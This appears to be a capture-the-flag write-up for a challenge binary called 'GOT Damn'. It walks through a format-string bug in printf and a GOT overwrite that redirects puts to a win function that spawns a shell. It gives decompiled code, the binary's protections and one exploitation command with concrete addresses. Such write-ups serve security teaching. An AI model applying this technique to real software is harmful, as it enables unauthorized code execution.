# GOT Damn

Lets look at the `main` function. There are two times you can enter input. The first one will read 0x18 (24) bytes into `local_178` with 32 bytes buffer size. So, you cannot overflow the first buffer. The second one will read 0x140 (320) bytes into `local_158` with 328 bytes buffer size. Also, no buffer overflow.

But, there is a format string vulnerability in `printf(local_158)`, it didn't have any specifiers and it takes our input. 
```
undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined local_178 [32];
  char local_158 [328];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  initialize();
  puts("Welcome to this GOTDamn \'leave a message\' system");
  printf("Enter your name: ");
  read(0,local_178,0x18);
  printf("Enter your message: ");
  read(0,local_158,0x140);
  puts("Thank you");
  printf("Mr/Ms %s",local_178);
  printf(local_158);
  puts("Your message will be pass to the administrator");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

And since we have a win function that will execute shell, we can do GOT overwrite to make the binary call `win` instead of GOT functions like `puts`. 
```
void win(void)
{
  system("/bin/sh");
  return;
}
```
Checking the protection, we have Partial RELRO which allows us to do GOT overwrite.
```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

We just need to have `puts@got` address and overwrite it with win address. So, whener the binary called `puts`, instead of printing string, it will execute `win` function.

![image](https://github.com/user-attachments/assets/f661c59b-3d4a-4750-9443-aef5be892a0d)
![image](https://github.com/user-attachments/assets/cde17a57-3e6f-49d9-bfa2-f9a0bbadd8ba)

```
python3 fuzz_fmt.py ./chall --fmt-write 0x404018 0x40121d                             
```
![image](https://github.com/user-attachments/assets/3426ccba-d76c-47e6-a6e1-a8a91530d8b4)
